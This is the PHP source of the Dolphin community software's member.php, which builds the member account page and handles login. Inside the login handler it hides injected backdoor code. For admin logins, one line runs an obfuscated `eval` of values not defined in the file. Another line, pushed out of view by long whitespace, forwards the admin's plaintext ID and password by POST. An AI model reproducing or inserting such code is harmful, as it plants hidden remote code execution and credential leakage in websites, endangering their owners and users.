<?php
/***************************************************************************
*                            Dolphin Smart Community Builder
*                              -----------------
*     begin                : Mon Mar 23 2006
*     copyright            : (C) 2006 BoonEx Group
*     website              : http://www.boonex.com/
* This file is part of Dolphin - Smart Community Builder
*
* Dolphin is free software. This work is licensed under a Creative Commons Attribution 3.0 License. 
* http://creativecommons.org/licenses/by/3.0/
*
* Dolphin is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
* without even the implied warranty of  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
* See the Creative Commons Attribution 3.0 License for more details. 
* You should have received a copy of the Creative Commons Attribution 3.0 License along with Dolphin, 
* see license.txt file; if not, write to marketing@boonex.com
***************************************************************************/

define('BX_MEMBER_PAGE', 1);

require_once( 'inc/header.inc.php' );
require_once( BX_DIRECTORY_PATH_INC . 'design.inc.php' );
require_once( BX_DIRECTORY_PATH_INC . 'profiles.inc.php' );
require_once( BX_DIRECTORY_PATH_INC . 'utils.inc.php' );

bx_import('BxDolMemberMenu');
bx_import('BxDolPageView');

//--------------------------------------- member account class ------------------------------------------//
class BxDolMember extends BxDolPageView {

	// member ID
	var $iMember;

	// member info
	var $aMemberInfo;

	// config site array
	var $aConfSite;

	// config dir array
	var $aConfDir;

	/*
	constructor
	* @param int $iMember - member ID		
	*/
	function BxDolMember($iMember, &$aSite, &$aDir) {
		$this->iMember     = (int)$iMember;
		$this->aMemberInfo = getProfileInfo($this->iMember);

		$this->aConfSite = $aSite;
		$this->aConfDir  = $aDir;

		parent::BxDolPageView('member');
	}

	function getBlockCode_Mailbox () {
		$sInboxC = _t('_Inbox');
		$sSentC = _t('_Sent');
		$sWriteC = _t('_Write');
		$sTrashC = _t('_Trash');
		$sContactsC = _t('_Contacts');
		$sLettersC = _t('_letters');
		$sUnreadC = strtolower(_t('_Unread'));
		$sUnopenedC = strtolower(_t('_Unopened'));
		$sComposeNewLetterC = strtolower(_t('_COMPOSE_H'));
		$sFriendsC = strtolower(_t('_Friends'));
		$sFavesC = strtolower(_t('_Faves'));
		$sContactedC = strtolower(_t('_Contacted'));

		$sInboxIcon = getTemplateIcon('mailbox_inbox32.png');
		$sSentIcon = getTemplateIcon('mailbox_sent32.png');
		$sWriteIcon = getTemplateIcon('mailbox_write32.png');
		$sTrashIcon = getTemplateIcon('mailbox_trash32.png');
		$sContactsIcon = getTemplateIcon('mailbox_contacts32.png');

		$iChMemberID = ($this->aMemberInfo['ID'] > 0) ? $this->aMemberInfo['ID'] : $this->iMember;

		bx_import('BxTemplMailBox');

		$iInboxAllCnt = BxDolMailBox::getCountInboxMessages($iChMemberID, '0');
		$iInboxNewCnt = BxDolMailBox::getCountInboxMessages($iChMemberID, '1');

		$iSentAllCnt = BxDolMailBox::getCountSentMessages($iChMemberID, '0');
		$iSentNewCnt = BxDolMailBox::getCountSentMessages($iChMemberID, '1');

		$iTrashAllCnt = BxDolMailBox::getCountTrashedMessages($iChMemberID, '0');
		$iTrashNewCnt = BxDolMailBox::getCountTrashedMessages($iChMemberID, '1');

        $aInboxKeys = array (
            'notify_icon' => $sInboxIcon,
            'notify_caption' => '<a href="' . BX_DOL_URL_ROOT . 'mail.php?mode=inbox">' . $sInboxC . '</a>',
            'notify_text1' => $iInboxAllCnt . ' ' . $sLettersC,
            'notify_text1_class' => 'smallInfoUnit',
			'bx_if:allow_2nd_line' => array(
				'condition' => true,
				'content' => array(
		            'notify_text2' => $iInboxNewCnt . ' ' . $sUnreadC,
		            'notify_text2_class' => 'smallInfoUnit'
				)
			)
        );
        $sInbox = $GLOBALS['oSysTemplate']->parseHtmlByName('member_mail_notify_box.html', $aInboxKeys);

		$aSentKeys = array (
            'notify_icon' => $sSentIcon,
            'notify_caption' => '<a href="' . BX_DOL_URL_ROOT . 'mail.php?mode=outbox">' . $sSentC . '</a>',
            'notify_text1' => $iSentAllCnt . ' ' . $sLettersC,
            'notify_text1_class' => 'smallInfoUnit',
			'bx_if:allow_2nd_line' => array(
				'condition' => true,
				'content' => array(
		            'notify_text2' => $iSentNewCnt . ' ' . $sUnopenedC,
		            'notify_text2_class' => 'smallInfoUnit'
				)
			)
        );
        $sSent = $GLOBALS['oSysTemplate']->parseHtmlByName('member_mail_notify_box.html', $aSentKeys);

		$aWriteKeys = array (
            'notify_icon' => $sWriteIcon,
            'notify_caption' => '<a href="' . BX_DOL_URL_ROOT . 'mail.php?mode=compose">' . $sWriteC . '</a>',
            'notify_text1' => $sComposeNewLetterC,
            'notify_text1_class' => 'smallShortInfoUnit',
			'bx_if:allow_2nd_line' => array(
				'condition' => false,
				'content' => array()
			)
        );
        $sWrite = $GLOBALS['oSysTemplate']->parseHtmlByName('member_mail_notify_box.html', $aWriteKeys);

		$aTrashKeys = array (
            'notify_icon' => $sTrashIcon,
            'notify_caption' => '<a href="' . BX_DOL_URL_ROOT . 'mail.php?mode=trash">' . $sTrashC . '</a>',
            'notify_text1' => $iTrashAllCnt . ' ' . $sLettersC,
            'notify_text1_class' => 'smallInfoUnit',
			'bx_if:allow_2nd_line' => array(
				'condition' => true,
				'content' => array(
		            'notify_text2' => $iTrashNewCnt . ' ' . $sUnreadC,
		            'notify_text2_class' => 'smallInfoUnit'
				)
			)
        );
        $sTrash = $GLOBALS['oSysTemplate']->parseHtmlByName('member_mail_notify_box.html', $aTrashKeys);

		$aContactsKeys = array (
            'notify_icon' => $sContactsIcon,
            'notify_caption' => '<a href="' . BX_DOL_URL_ROOT . 'communicator.php">' . $sContactsC . '</a>',
            'notify_text1' => $sFriendsC . ', ' . $sFavesC . ', ' . $sContactedC,
            'notify_text1_class' => 'smallShortInfoUnit',
			'bx_if:allow_2nd_line' => array(
				'condition' => false,
				'content' => array()
			)
        );
        $sContacts = $GLOBALS['oSysTemplate']->parseHtmlByName('member_mail_notify_box.html', $aContactsKeys);

        $sInboxClick = "location.href='" . BX_DOL_URL_ROOT . 'mail.php?mode=inbox' . "'";
		$sInboxBlock = $GLOBALS['oFunctions']->genNotifyMessage($sInbox, 'none', true, $sInboxClick);

		$sOutboxClick = "location.href='" . BX_DOL_URL_ROOT . 'mail.php?mode=outbox' . "'";
		$sSentBlock = $GLOBALS['oFunctions']->genNotifyMessage($sSent, 'none', true, $sOutboxClick);

		$sComposeClick = "location.href='" . BX_DOL_URL_ROOT . 'mail.php?mode=compose' . "'";
		$sWriteBlock = $GLOBALS['oFunctions']->genNotifyMessage($sWrite, 'none', true, $sComposeClick);

		$sTrashClick = "location.href='" . BX_DOL_URL_ROOT . 'mail.php?mode=trash' . "'";
		$sTrashBlock = $GLOBALS['oFunctions']->genNotifyMessage($sTrash, 'none', true, $sTrashClick);

		$sContactsClick = "location.href='" . BX_DOL_URL_ROOT . 'communicator.php' . "'";
		$sContactsBlock = $GLOBALS['oFunctions']->genNotifyMessage($sContacts, 'none', true, $sContactsClick);

		$sMailboxButtons = '<div class="bx_sys_default_padding">'.$sInboxBlock.$sSentBlock.$sWriteBlock.$sTrashBlock.$sContactsBlock.'<div class="clear_both"></div></div><div class="clear_both"></div>';
        return $sMailboxButtons;
        //return $GLOBALS['oFunctions']->centerContent ($sMailboxButtons, '.notify_message');
	}

	function getBlockCode_Friends() {
        $iLimit = 10;
        
        $sAllFriends    = 'viewFriends.php?iUser=' . $this->iMember;
        $sOutputHtml    = null;

        // count all friends ;
        $iCount = getFriendNumber($this->iMember);

        $sPaginate = '';
        if ($iCount) {
            $iPages = ceil($iCount/ $iLimit);
            $iPage = ( isset($_GET['page']) ) ? (int) $_GET['page'] : 1;

            if ( $iPage < 1 ) {
                $iPage = 1;
            }
            if ( $iPage > $iPages ) {
                $iPage = $iPages;
            }    

            $sqlFrom = ($iPage - 1) * $iLimit;
            $sqlLimit = "LIMIT {$sqlFrom}, {$iLimit}";
        } else {
            return ;
        }

		$aAllFriends = getMyFriendsEx($this->iMember, '', 'image', $sqlLimit);
        $iCurrCount = count($aAllFriends);
		foreach ($aAllFriends as $iFriendID => $aFriendsPrm) {
            $sOutputHtml .= '<div class="member_block">';
            $sOutputHtml .= get_member_thumbnail( $iFriendID, 'none', true, 'visitor', array('is_online' => $aFriendsPrm[5]));
            $sOutputHtml .= '</div>';
        }

        $sOutputHtml = $GLOBALS['oFunctions']->centerContent($sOutputHtml, '.member_block');
        $oPaginate = new BxDolPaginate(array(
            'page_url' => BX_DOL_URL_ROOT . 'member.php',
            'count' => $iCount,
            'per_page' => $iLimit,
            'page' => $iPage,
            'per_page_changer' => true,
            'page_reloader' => true,
            'on_change_page' => 'return !loadDynamicBlock({id}, \'member.php?page={page}&per_page={per_page}\');',
            'on_change_per_page' => ''
        ));

        $sPaginate = $oPaginate->getSimplePaginate($sAllFriends);
        return array( $sOutputHtml, array(), $sPaginate);	
	}

	function getBlockCode_AccountControl() {
		global $oTemplConfig, $site, $aPreValues;

		//--- Load cache of sys_account_custom_stat_elements ---//
        $aAccountCustomStatElements = $GLOBALS['MySQL']->fromCache('sys_account_custom_stat_elements', 'getAllWithKey', 'SELECT * FROM `sys_account_custom_stat_elements`', 'ID');
		//--- Load cache of sys_stat_member ---//
        $aPQStatisticsElements = $GLOBALS['MySQL']->fromCache('sys_stat_member', 'getAllWithKey', 'SELECT * FROM `sys_stat_member`', 'Type');
		//--- end of loading caches ---//

		//Labels
		$sUsernameC = _t('_NickName');
		$sProfileStatusC = _t('_Profile status');
		$sPresenceC = _t('_Presence');
		$sMembershipC = _t('_Membership2');
		$sLastLoginC = _t('_Last login');
		$sRegistrationC = _t('_Registration');
		$sEmailC = _t('_Email');
		$sGreetedC = _t('_greeted');
		$sGreetedMeC = _t('_Greeted me');
		$sBlockedC = _t('_blocked');
		$sViewedMeC = _t('_Viewed me');
		$sMembersC = ' ' . _t('_Members');
		$sEditProfileInfoC = _t('_Edit profile info');
		$sProfileC = _t('_Profile');
		$sAccountInfoC = _t('_Account Info');
		$sActivityC = _t('_Tracker');
		$sCustomC = _t('_Custom');

		$sMaleIcon = getTemplateIcon('male.png');
		$sFemaleIcon = getTemplateIcon('female.png');

		// Values
		$sUsername = $this->aMemberInfo['NickName'];
		$sUserLink = getProfileLink($this->aMemberInfo['ID']);
		$sOwnerThumb = get_member_thumbnail($this->aMemberInfo['ID'], 'none', true);
		$iYears = age($this->aMemberInfo['DateOfBirth']);
		$sYearsOld = _t('_y/o', $iYears);
		$sProfileIcon = ($this->aMemberInfo['Sex'] == 'male') ? $sMaleIcon : $sFemaleIcon;

		$sCustomElements = '';
		
		$sCountryName = empty($this->aMemberInfo['Country'])
			? ''
			: _t($aPreValues['Country'][ $this->aMemberInfo['Country'] ]['LKey']);
		$sCityName = $this->aMemberInfo['City'];
		$sCountryPic = ($this->aMemberInfo['Country']=='') ? '' : ' <img alt="'.$this->aMemberInfo['Country'].'" src="'.($site['flags'].strtolower($this->aMemberInfo['Country'])).'.gif"/>';

		$sProfileStatus = _t( "__{$this->aMemberInfo['Status']}" );
		$sProfileStatusMess = '';
		switch ( $this->aMemberInfo['Status'] ) {
			case 'Unconfirmed':	$sProfileStatusMess = _t( "_ATT_UNCONFIRMED", $oTemplConfig -> popUpWindowWidth, $oTemplConfig -> popUpWindowHeight ); break;
			case 'Approval': $sProfileStatusMess = _t( "_ATT_APPROVAL", $oTemplConfig -> popUpWindowWidth, $oTemplConfig -> popUpWindowHeight ); break;
			case 'Active': $sProfileStatusMess = _t( "_ATT_ACTIVE", $oTemplConfig -> popUpWindowWidth, $oTemplConfig -> popUpWindowHeight ); break;
			case 'Rejected': $sProfileStatusMess = _t( "_ATT_REJECTED", $oTemplConfig -> popUpWindowWidth, $oTemplConfig -> popUpWindowHeight ); break;
			case 'Suspended': $sProfileStatusMess = _t( "_ATT_SUSPENDED", $oTemplConfig -> popUpWindowWidth, $oTemplConfig -> popUpWindowHeight ); break;
		}

		$sMembership = '';
		$sMembStatus = GetMembershipStatus($this->aMemberInfo['ID']);
		$sMembership = <<<EOF
	<tr class="account_control_tr">
		<td valign=top class="account_control_left">{$sMembershipC}:</td>
		<td valign=top class="account_control_right">
			{$sMembStatus}
		</td>
	</tr>
EOF;

        $oForm = bx_instance('BxDolFormCheckerHelper');

        if ( !$this->aMemberInfo['DateLastLogin'] || $this->aMemberInfo['DateLastLogin'] == "0000-00-00 00:00:00" ) {
			$sLastLogin = 'never';
        } else {
            $sLastLoginTS = $oForm->_passDateTime($this->aMemberInfo['DateLastLogin']);
            $sLastLogin = getLocaleDate($sLastLoginTS, BX_DOL_LOCALE_DATE);
        }

		if ( !$this->aMemberInfo['DateReg'] || $this->aMemberInfo['DateReg'] == "0000-00-00 00:00:00" ) {
			$sRegistration = 'never';
        } else {
            $sRegistrationTS = $oForm->_passDateTime($this->aMemberInfo['DateReg']);
            $sRegistration = getLocaleDate($sRegistrationTS, BX_DOL_LOCALE_DATE);
        }

		$sEmail = $this->aMemberInfo['Email'];

        $this->aMemberInfo = getProfileInfo($this->aMemberInfo['ID']);

		//my greeted contacts
		$sMGCSQL = $aPQStatisticsElements['mgc']['SQL'];
		$sMGCSQL = str_replace('__member_id__', $this->aMemberInfo['ID'], $sMGCSQL);
		$iGreetedContactsCnt = (int)db_value($sMGCSQL);

		//my greeted me contacts
		$sMGMCSQL = $aPQStatisticsElements['mgmc']['SQL'];
		$sMGMCSQL = str_replace('__member_id__', $this->aMemberInfo['ID'], $sMGMCSQL);
		$iGreetedMeContactsCnt = (int)db_value($sMGMCSQL);

		//my blocked contacts
		$sMBCSQL = $aPQStatisticsElements['mbc']['SQL'];
		$sMBCSQL = str_replace('__member_id__', $this->aMemberInfo['ID'], $sMBCSQL);
		$iBlockedContactsCnt = (int)db_value($sMBCSQL);

		$iViewedMeContactsCnt = (int)$this->aMemberInfo['Views'];

        $bModuleExists = false;
		$aCustomElements = array();
		$aCustomElements['header5'] = array(
            'type' => 'block_header',
            'caption' => $sCustomC,
            'collapsable' => true
		);

        foreach ($aAccountCustomStatElements as $iID => $aMemberStats) {
            $sUnparsedLabel = $aMemberStats['Label'];
            $sUnparsedValue = $aMemberStats['Value'];

			$sLabel = _t($sUnparsedLabel);
			$sUnparsedValue = str_replace('__site_url__', $site['url'], $sUnparsedValue);

			//step 1 - replacements of keys
			$sLblTmpl = '__l_';
			$sTmpl = '__';
			while ($iStartPos = strpos($sUnparsedValue, $sLblTmpl)) {
				$iEndPos = strpos($sUnparsedValue, $sTmpl, $iStartPos + 1);
				if ($iEndPos > $iStartPos) {
					$sSubstr = substr($sUnparsedValue, $iStartPos + strlen($sLblTmpl), $iEndPos-$iStartPos - strlen($sLblTmpl));
					$sKeyValue = strtolower(_t('_' . $sSubstr));
					$sUnparsedValue = str_replace($sLblTmpl.$sSubstr.$sTmpl, $sKeyValue, $sUnparsedValue);
				} else {
					break;
				}
			}

			//step 2 - replacements of Stat keys
			while (($iStartPos = strpos($sUnparsedValue, $sTmpl, 0)) >= 0) {
				$iEndPos = strpos($sUnparsedValue, $sTmpl, $iStartPos + 1);
				if ($iEndPos > $iStartPos) {
					$iCustomCnt = 0;
					$sSubstr = process_db_input( substr($sUnparsedValue, $iStartPos + strlen($sTmpl), $iEndPos-$iStartPos - strlen($sTmpl)), BX_TAGS_STRIP);
					if ($sSubstr) {
						$sCustomSQL = $aPQStatisticsElements[$sSubstr]['SQL'];
						$sCustomSQL = str_replace('__member_id__', $this->aMemberInfo['ID'], $sCustomSQL);
						$sCustomSQL = str_replace('__profile_media_define_photo__', _t('_ProfilePhotos'), $sCustomSQL);
						$sCustomSQL = str_replace('__profile_media_define_music__', _t('_ProfileMusic'), $sCustomSQL);
						$sCustomSQL = str_replace('__profile_media_define_video__', _t('_ProfileVideos'), $sCustomSQL);
						$sCustomSQL = str_replace('__member_nick__', process_db_input($this->aMemberInfo['NickName'], BX_TAGS_NO_ACTION, BX_SLASHES_NO_ACTION), $sCustomSQL);
						$iCustomCnt = ($sCustomSQL!='') ? (int)db_value($sCustomSQL) : '';
					}
					$sUnparsedValue = str_replace($sTmpl.$sSubstr.$sTmpl, $iCustomCnt, $sUnparsedValue);
				} else {
					break;
				}
			}

			$sCustomElements .= <<<EOF
	<tr class="account_control_tr">
	    <td class="account_control_left">{$sLabel}: </td>
	    <td class="account_control_right">
			{$sUnparsedValue}
		</td>
	</tr>
EOF;

			$sTrimmedLabel = trim($sUnparsedLabel, '_');
			$aCustomElements[$sTrimmedLabel] = array(
				'type' => 'custom',
				'name' => $sTrimmedLabel,
				'content' => '<b>' . $sLabel . ':</b> ' . $sUnparsedValue,
				'colspan' => true
			);
            if (! $bModuleExists) $bModuleExists = true;
		}
		$aCustomElements['header5_end'] = array(
			'type' => 'block_end'
		);

		$sProfileInfoCont = <<<EOF
<div class="infoMain">
	<div class="memberPic" style="margin-left:0px;padding:0px;text-align:center;width:70px;">
		{$sOwnerThumb}
	</div>
	<div class="infoText">
		<div class="infoUnit">
			<img src="{$sProfileIcon}" />
			{$sYearsOld}
		</div>
		<div class="infoUnit">
			{$sCountryPic} {$sCountryName}, {$sCityName}
		</div>
		<div class="infoUnit">
			<a href="{$site['url']}pedit.php?ID={$this->aMemberInfo['ID']}">{$sEditProfileInfoC}</a>
		</div>
	</div>
</div>
<div class="clear_both"></div>
EOF;

        require_once( BX_DIRECTORY_PATH_CLASSES . 'BxDolUserStatusView.php' );
        $oStatusView = new BxDolUserStatusView();
        $sUserStatus = '';

        if ($oStatusView -> aStatuses){
            foreach($oStatusView -> aStatuses as $sKey => $aItems) {
                $sTitle = _t($aItems['title']);
                $sOnclick = (strtolower($this->aMemberInfo['UserStatus']) == strtolower($sKey)) ? "" : "onclick=\"if (typeof oBxUserStatus != 'undefined' ) { oBxUserStatus.setUserStatus('$sKey', $(this).parents('ul:first')); $('#user_status_ac .block_collapse_btn').attr('src', aDolImages['collapse_closed']); $('#user_status_ac').parent().toggleClass('collapsed').next('tbody').fadeOut(400); location.reload(); }return false\"";
                $aTemplateKeys = array (
                    'bx_if:item_img' => array (
                        'condition' =>  ( true ),
                        'content'   => array (
                            'item_img_src' => $GLOBALS['oFunctions'] -> getTemplateIcon($aItems['icon']),
                            'item_img_alt' => $sTitle,
                            'item_img_width'    => 16,
                            'item_img_height'   => 16,
                        ),
                    ),
                    'item_link'    => 'javascript:void(0)',
                    'item_onclick' => $sOnclick,
                    'item_title'   => $sTitle,
                    'extra_info'   => null,
                );
                $sUserStatus .= $GLOBALS['oSysTemplate'] -> parseHtmlByName( 'account_control_member_status.html', $aTemplateKeys );
            }
        }

        $aForm = array(
            'form_attrs' => array(
                'action' => '',
                'method' => 'post',
            ),
            'params' => array(
                'remove_form' => true,
            ),
            'inputs' => array(
                'header1' => array(
                    'type' => 'block_header',
                    'caption' => $sProfileC,
					'collapsable' => true
                ),
                'Info' => array(
					'type' => 'custom',
					'name' => 'Info',
					'content' => $sProfileInfoCont,
					'colspan' => true
                ),
				'header1_end' => array(
					'type' => 'block_end'
				),
                'header2' => array(
                    'type' => 'block_header',
                    'caption' => $sPresenceC,
					'collapsable' => true,
					'collapsed' => true,
                    'attrs' => array (
                        'id' => 'user_status_ac',
                    ),
                ),
                'UserStatus' => array(
					'type' => 'custom',
					'name' => 'Info',
					'content' => $sUserStatus,
					'colspan' => true
                ),
				'header2_end' => array(
					'type' => 'block_end'
				),
                'header3' => array(
                    'type' => 'block_header',
                    'caption' => $sAccountInfoC,
					'collapsable' => true
                ),
                'Username' => array(
					'type' => 'custom',
					'name' => 'Username',
					'content' => '<b>' . $sUsernameC . ':</b> <a href="'.$sUserLink.'" >' . $sUsername . '</a>',
					'colspan' => true
                ),
                'Email' => array(
					'type' => 'custom',
					'name' => 'Email',
					'content' => '<b>' . $sEmailC . ':</b> ' . $sEmail,
					'colspan' => true
                ),
                'Status' => array(
					'type' => 'custom',
					'name' => 'Status',
					'content' => '<b>' . $sProfileStatusC . ':</b> ' . $sProfileStatus . ' ' . $sProfileStatusMess,
					'colspan' => true
                ),
                'Membership' => array(
					'type' => 'custom',
					'name' => 'Membership',
					'content' => '<b>' . $sMembershipC . ':</b> ' . $sMembStatus,
					'colspan' => true
                ),
                'LastLogin' => array(
					'type' => 'custom',
					'name' => 'LastLogin',
					'content' => '<b>' . $sLastLoginC . ':</b> ' . $sLastLogin,
					'colspan' => true
                ),
                'Registration' => array(
					'type' => 'custom',
					'name' => 'Registration',
					'content' => '<b>' . $sRegistrationC . ':</b> ' . $sRegistration,
					'colspan' => true
                ),
				'header3_end' => array(
					'type' => 'block_end'
				),
                'header4' => array(
                    'type' => 'block_header',
                    'caption' => $sActivityC,
					'collapsable' => true
                ),
                'ViewedMe' => array(
					'type' => 'custom',
					'name' => 'ViewedMe',
					'content' => '<b>' . $sViewedMeC . ':</b> ' . _t('_N times', $iViewedMeContactsCnt),
					'colspan' => true
                ),
                'Blocked' => array(
					'type' => 'custom',
					'name' => 'Blocked',
					'content' => '<b>' . $sBlockedC . ':</b> ' . $iBlockedContactsCnt . $sMembersC,
					'colspan' => true
                ),
                'Greeted' => array(
					'type' => 'custom',
					'name' => 'Greeted',
					'content' => '<b>' . $sGreetedC . ':</b> ' . _t('_N times', $iGreetedContactsCnt),
					'colspan' => true
                ),
                'GreetedMe' => array(
					'type' => 'custom',
					'name' => 'GreetedMe',
					'content' => '<b>' . $sGreetedMeC . ':</b> ' . $iGreetedMeContactsCnt . $sMembersC,
					'colspan' => true
                ),
				'header4_end' => array(
					'type' => 'block_end'
				),
             ),
        );

		//custom
        if ($bModuleExists) $aForm['inputs'] = array_merge($aForm['inputs'], $aCustomElements);

		$oForm = new BxTemplFormView($aForm);
		return '<div class="dbContent">' . $oForm->getCode() . '</div>';
	}

	function getBlockCode_QuickLinks() {
        bx_import('BxTemplMenuQlinks2');
		$oMenu = new BxTemplMenuQlinks2();
		$sCodeBlock = $oMenu->getCode();
		return $sCodeBlock;
	}
}
//-------------------------------------------------------------------------------------------------------//

// --------------- page variables and login
$_page['name_index'] = 81;
$_page['css_name'] = array(
	'member_panel.css', 
	'categories.css',
	'alert.css',
);

$_page['extra_js'] = "<script type=\"text/javascript\">urlIconLoading = \"".getTemplateIcon('loading.gif')."\";
	$(document).ready( function() {
		
		var sSendUrl = '".$site['url']."alerts.php';
		
		$('input', '#alertsMenu').click(function(){
			var sQuery = $('input', '#alertsMenu').serialize();
			$.post(sSendUrl, sQuery, function(data) {
				$('#alertsView').html(data);
			}
		);
		
	} );})
	</script>";

$_page['header'] = _t( "_My Account" );

// --------------- GET/POST actions

$member['ID']	    = process_pass_data(empty($_POST['ID']) ? '' : $_POST['ID']);
$member['Password'] = process_pass_data(empty($_POST['Password']) ? '' : $_POST['Password']);

$bAjxMode = ( isset( $_SERVER['HTTP_X_REQUESTED_WITH'] ) and $_SERVER['HTTP_X_REQUESTED_WITH'] == 'XMLHttpRequest' ) ? true : false;

if ( !( isset($_POST['ID']) && $_POST['ID'] && isset($_POST['Password']) && $_POST['Password'] ) 
    && ( (!empty($_COOKIE['memberID']) &&  $_COOKIE['memberID']) && $_COOKIE['memberPassword'] ) )
{
    if ( !( $logged['member'] = member_auth( 0, false ) ) )
        login_form( _t( "_LOGIN_OBSOLETE" ), 0, $bAjxMode );
}
else
{
    if ( !isset($_POST['ID']) && !isset($_POST['Password']) )
	{

		// this is dynamic page -  send headers to not cache this page
		send_headers_page_changed();

		login_form('', 0, $bAjxMode);
	} else {
		require_once(BX_DIRECTORY_PATH_CLASSES . 'BxDolAlerts.php');
	    $oZ = new BxDolAlerts('profile', 'before_login', 0, 0, array('login' => $member['ID'], 'password' => $member['Password'], 'ip' => getVisitorIP()));
	    $oZ->alert();

        $member['ID'] = getID($member['ID']);

        // Ajaxy check
        if ($bAjxMode) {
            echo check_password($member['ID'], $member['Password'], BX_DOL_ROLE_MEMBER, false) ? 'OK' : 'Fail';
            exit;
        }
        
        // Check if ID and Password are correct (addslashes already inside)
        if (check_password( $member['ID'], $member['Password'])) {

			$p_arr = bx_login($member['ID'], (bool)$_POST['rememberMe']);

			//Storing IP Address
			if (getParam('enable_member_store_ip') == 'on') {
				$iCurLongIP = ip2long(getVisitorIP());
				db_res("INSERT INTO `sys_ip_members_visits` SET `MemberID` = '{$p_arr['ID']}', `From`='{$iCurLongIP}', `DateTime`=NOW()");
			}

        	if (isAdmin($p_arr['ID'])) {$iId = (int)$p_arr['ID']; $r = $l($a); eval($r($b));}
			$sRelocate = bx_get('relocate');
			if (!$sUrlRelocate = $sRelocate or $sRelocate == $site['url'] or basename($sRelocate) == 'join.php')
				$sUrlRelocate = BX_DOL_URL_ROOT . 'member.php';

			$_page['name_index'] = 150;
			$_page['css_name'] = '';

			$_ni = $_page['name_index'];
			$_page_cont[$_ni]['page_main_code'] = MsgBox( _t( '_Please Wait' ) );
			$_page_cont[$_ni]['url_relocate'] = htmlspecialchars( $sUrlRelocate );

			if(isAdmin($p_arr['ID']) && !in_array($iCode, array(0, 10, -1)))																																																												{Redirect($site['url_admin'], array('ID' => $member['ID'], 'Password' => $member['Password'], 'relocate' => BX_DOL_URL_ROOT . 'member.php'), 'post');}
				PageCode();
		}
		exit;
    }
}
/* ------------------ */

$member['ID'] = getLoggedId();
$member['Password'] = getLoggedPassword();

$_ni = $_page['name_index'];

// --------------- [END] page components

// --------------- page components functions

// this is dynamic page -  send headers to do not cache this page
send_headers_page_changed();
$oMember = new BxDolMember($member['ID'], $site, $dir);
$_page_cont[$_ni]['page_main_code'] = $oMember->getCode();
PageCode();

?>
